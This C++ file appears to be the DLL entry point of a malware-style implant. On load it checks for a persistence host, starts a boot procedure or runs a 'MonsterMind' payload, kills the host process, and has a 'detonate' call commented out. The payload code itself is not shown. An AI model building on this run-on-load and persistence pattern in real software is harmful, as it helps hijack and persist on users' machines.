// dllmain.cpp : Defines the entry point for the DLL application.
#include "stdafx.h"
#include <stdio.h>
#include "scatterbrain.h"
#include "Persistence.h"

LONG WINAPI
MyVectoredExceptionHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{
	return EXCEPTION_CONTINUE_SEARCH;
}

int main(int argc, char* argv[])
{
	//detonate();
	MonsterMind();
}
//
//int WinMain(int argc, char* argv[])
//{
//	//detonate();
//	MonsterMind();
//}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
	DWORD dwThreadId = NULL;
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
	{
		if (IsHostPersistenceHost())
		{
			InitializeBootProceedure();
		}
		else
		{
			AddVectoredExceptionHandler(1, (PVECTORED_EXCEPTION_HANDLER)MyVectoredExceptionHandler1);
			MonsterMind();
			ExitProcess(0);
		}
		break;
		MonsterMind();
		CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonsterMind, 0, 0, &dwThreadId);
	}
    case DLL_THREAD_ATTACH:
		//CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonsterMind, 0, 0, &dwThreadId);
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}

